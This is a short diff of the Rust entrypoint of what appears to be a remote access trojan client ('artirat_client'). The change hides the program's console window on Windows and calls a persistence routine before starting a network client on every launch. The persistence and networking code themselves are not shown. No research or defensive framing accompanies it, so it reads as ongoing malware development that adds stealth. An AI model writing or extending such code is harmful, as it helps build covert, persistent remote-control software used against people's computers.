@@ -1,17 +1,13 @@
-mod lib;
-//use artirat_client::netclient;
-use anyhow::Result;
-#[cfg(target_os = "windows")]
-mod persist;
-#[cfg(target_os = "windows")]
-use persist::persist;
+#![windows_subsystem = "windows"]
 
-const IS_DLL: bool = false; 
-/// Actual binary entrypoint (thin wrapper)
+mod lib;
+use anyhow::Result;
+
+const IS_DLL: bool = false;
+
 #[tokio::main]
 async fn main() -> Result<()> {
-    #[cfg(target_os = "windows")]
-    persist::persist(IS_DLL);
+    lib::persist::persist(IS_DLL);
     lib::netclient().await;
     Ok(())
 }
